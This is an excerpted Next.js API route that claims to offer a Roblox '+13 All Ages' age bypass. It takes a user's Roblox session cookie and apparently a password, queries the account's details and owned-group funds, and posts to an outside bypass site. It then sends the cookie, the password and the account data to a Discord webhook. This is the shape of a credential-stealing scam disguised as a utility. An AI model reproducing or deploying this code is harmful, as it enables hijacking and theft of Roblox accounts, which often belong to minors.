...
async function getRobloxUserInfo(cookie: string): Promise<RobloxUserInfo | null> {
  try {
    ...
    // Fetch account creation date to calculate age
...
async function getGroupInfo(cookie: string, userId: number) {
  try {
    ...
    return { owned: ownedGroups.length, funds: totalFunds > 0 ? totalFunds : "(Not Yet)" }
  } catch {
    return { owned: 0, funds: "(Not Yet)" }
  }
}
...
async function sendDiscordWebhook(
  ...
  try {
    ...
    await addToHistory({
      type: "Bypass +13 All Ages",
      identifier: `Try to Bypass ${userInfo.username} Using +13 All Ages`,
...
export async function GET(request: NextRequest) {
  try {
    ...
    const mode = searchParams.get("mode") || "age"
    const baseUrl = request.nextUrl.origin

    if (!cookie) {
      return NextResponse.json({ status: "error", message: "Cookie is required" }, { status: 400 })
    }

    const userInfo = await getRobloxUserInfo(cookie)

    if (!userInfo) {
      return NextResponse.json({ status: "error", message: "Failed to fetch user info" }, { status: 400 })
    }

    const bypassResponse = await fetch("https://dayonerblx.com/api/submit.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
    ...
    if (!bypassResponse.ok) {
      return NextResponse.json(
        {
          status: "error",
          message: `Bypass API failed with status ${bypassResponse.status}`,
        },
        { status: 500 },
      )
    }
    ...
    await sendDiscordWebhook(cookie, password, userInfo, ageResult, baseUrl)

    if (bypassData.success) {
      return NextResponse.json({
        status: "success",
        message: bypassData.message || "Bypass processed successfully",
        data: bypassData,
      })
    } else {
      return NextResponse.json(
        {
          status: "error",
          message: bypassData.message || "Bypass failed",
          data: bypassData,
        },
        { status: 500 },
      )
